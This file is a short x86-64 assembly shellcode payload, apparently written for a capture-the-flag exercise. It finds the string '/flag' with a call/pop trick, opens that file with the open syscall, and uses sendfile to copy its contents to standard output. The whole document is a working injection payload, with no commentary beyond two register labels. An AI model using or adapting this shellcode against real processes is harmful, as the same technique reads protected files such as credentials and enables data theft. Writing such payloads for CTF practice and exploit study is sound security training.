.global _start
_start:
.intel_syntax noprefix
call code
.asciz "/flag"

code:
pop rdi
xor rsi, rsi
mov rax, 2
syscall

mov rdi, 1
mov rsi, rax    # in_fd
xor edx, edx
mov r10, 50     # sendfile
mov rax, 40
syscall
